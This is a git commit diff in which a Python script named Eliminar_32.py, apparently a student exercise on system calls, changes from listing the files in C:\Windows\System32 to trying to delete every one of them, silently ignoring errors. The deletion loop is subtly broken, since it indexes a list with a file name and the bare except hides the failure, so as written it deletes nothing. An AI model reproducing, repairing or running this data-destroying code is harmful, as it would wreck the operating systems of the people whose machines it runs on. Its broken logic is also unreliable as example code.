419a8b2db47f72916cf74c20d5cb8e9725e31c59
Santiago <dmirandam@unal.edu.co>
2021-10-25 17:30:05 -0500

    Update Eliminar_32.py

--- llamadosalsistema/Eliminar_32.py
+++ llamadosalsistema/Eliminar_32.py
@@ -1,7 +1,11 @@
 
 import os
+from os import remove
 os.chdir(r"C:\Windows\System32")
 routes=(os.listdir("C:\Windows\System32"))
 print(len(routes))
 for i in routes:
-    print(i)
+    try:
+        remove(routes[i])
+    except:
+        pass    
